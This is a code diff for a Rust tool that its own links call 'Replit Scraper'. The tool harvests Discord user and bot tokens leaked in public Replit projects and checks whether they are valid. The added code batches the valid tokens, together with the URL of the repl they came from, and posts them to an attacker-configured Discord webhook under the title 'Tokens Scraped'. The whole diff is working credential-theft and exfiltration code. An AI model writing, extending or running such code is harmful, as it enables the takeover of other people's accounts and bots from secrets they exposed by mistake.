@@ -84,9 +84,111 @@ struct Retry {
     retry_after: f32
 }
 
+
+pub struct Webhook {
+    url: String,
+}
+
+impl Webhook {
+    pub fn new(url: &str) -> Self {
+        Self { url: url.to_string() }
+    }
+
+    pub async fn send(&self, repl_url: &str, token_type: &str, tokens: Vec<String>) {
+        let client = Client::new();
+        let start = format!("```fix\nValid Tokens: {}\nURL: {}```", tokens.len(), repl_url);
+        let mut da_str = "".to_owned();
+        for token in tokens {
+            da_str.push_str(&format!("{},\n", token));
+            if da_str.len() > 900 {
+                let second = format!("```ini\n[\n{}]```", da_str);
+                let json = json!({
+                    "embeds": [
+                        {
+                            "author": {
+                                "name": format!("{} Tokens Scraped", token_type),
+                                "url": "https://github.com/Shell1010/Repl-Scraper",
+                                "avatar_url": "https://cdn.discordapp.com/attachments/1041468395822006324/1041505288588623922/other_omega.png",
+                            },
+                            "fields": [
+                                {
+                                    "name": "\u{200b}",
+                                    "value": start,
+                                    "inline": false
+                                },
+                                {
+                                    "name": "**Tokens**",
+                                    "value": second,
+                                    "inline": true,
+                                }
+                            ],
+                            "footer": {
+                                "text": "Replit Scraper・https://github.com/Shell1010/Repl-Scraper"
+                            }
+                        }
+                    ]
+                });
+                let resp = client.post(&self.url)
+                    .json(&json)
+                    .send().await.unwrap();
+
+                if resp.status().is_success() {
+                    println!("Sent the embed!");
+                } else {
+                    println!("Failed to send embed\nReason: {}", resp.text().await.unwrap());
+                }
+                da_str.clear();
+            }
+        }
+        if da_str.len() > 900 {}
+        else {
+            let second = format!("```ini\n[\n{}]```", da_str);
+            let json = json!({
+                "embeds": [
+                    {
+                        "author": {
+                            "name": format!("{} Tokens Scraped", token_type),
+                            "url": "https://github.com/Shell1010/Repl-Scraper",
+                            "avatar_url": "https://cdn.discordapp.com/attachments/1041468395822006324/1041505288588623922/other_omega.png",
+                        },
+                        "fields": [
+                            {
+                                "name": "\u{200b}",
+                                "value": start,
+                                "inline": false
+                            },
+                            {
+                                "name": "**Tokens**",
+                                "value": second,
+                                "inline": true,
+                            }
+                        ],
+                        "footer": {
+                            "text": "Replit Scraper・https://github.com/Shell1010/Repl-Scraper"
+                        }
+                    }
+                ]
+            });
+            let resp = client.post(&self.url)
+                .json(&json)
+                .send().await.unwrap();
+
+            if resp.status().is_success() {
+                println!("Sent the embed!");
+            } else {
+                println!("Failed to send embed\nReason: {}", resp.text().await.unwrap());
+            }
+        }
+
+
+
+    }
+}
+
 #[derive(Clone)]
 pub struct Replit {
     url: String,
+    webhook_url: Option<String>
 }
 
 fn is_hidden(entry: &DirEntry) -> bool {
@@ -99,8 +201,8 @@ fn is_hidden(entry: &DirEntry) -> bool {
 }
 
 impl Replit {
-    pub fn new(url: &str) -> Self {
-        Self {url: url.to_string()}
+    pub fn new(url: &str, webhook_url: Option<String>) -> Self {
+        Self {url: url.to_string(), webhook_url}
     }
 
     pub async fn get_id(&self) -> String {
@@ -317,12 +419,14 @@ impl Replit {
         tokens
     }
 
-    pub async fn self_check_tokens(&self, client: Arc<Client>, token: String) {
+    pub async fn self_check_tokens(&self, client: Arc<Client>, token: String) -> Vec<String> {
         let file_writer = OpenOptions::new()
             .create(true)
             .append(true)
             .open("valid.txt")
             .await;
+
+        let mut tokens: Vec<String> = vec![];
 
         match file_writer {
             Ok(file) => {
@@ -336,6 +440,7 @@ impl Replit {
                             if resp.status().is_success() {
                                 file.write_all(format!("{}\n", token.clone()).as_bytes()).await.expect("Failed to write file");
                                 println!("\x1b[44;93mUser Token: {} is valid!\x1b[0m", &token);
+                                tokens.push(token);
                                 break
                             } else if resp.status().as_u16() == 429 {
                                 let j = resp.json::<Retry>().await.unwrap();
@@ -352,16 +457,19 @@ impl Replit {
             },
             Err(e) => println!("\x1b[0;91mError: {e}\x1b[0m")
         }
+        tokens
 
 
     }
 
-    pub async fn bot_check_tokens(&self, client: Arc<Client>, token: String) {
+    pub async fn bot_check_tokens(&self, client: Arc<Client>, token: String) -> Vec<String> {
         let file_writer = OpenOptions::new()
             .create(true)
             .append(true)
             .open("valid.txt")
             .await;
+
+        let mut tokens: Vec<String> = vec![];
 
         match file_writer {
             Ok(file) => {
@@ -375,6 +483,7 @@ impl Replit {
                             if resp.status().is_success() {
                                 file.write_all(format!("{}\n", token.clone()).as_bytes()).await.expect("Failed to write file");
                                 println!("\x1b[44;93mBot Token: {} is valid!\x1b[0m", &token);
+                                tokens.push(token);
                                 break
                             } else if resp.status().as_u16() == 429 {
                                 let j = resp.json::<Retry>().await.unwrap();
@@ -391,6 +500,17 @@ impl Replit {
             },
             Err(e) => println!("\x1b[0;91mError: {e}\x1b[0m")
         }
+        tokens
     }
+
+    pub async fn send(&self, token_type: &str, tokens: Vec<String>) {
+        if self.webhook_url.is_some() {
+            let web = Webhook::new(self.webhook_url.as_ref().unwrap());
+            web.send(&self.url, token_type, tokens).await;
+        }
+    }
+
+
+
 }
 
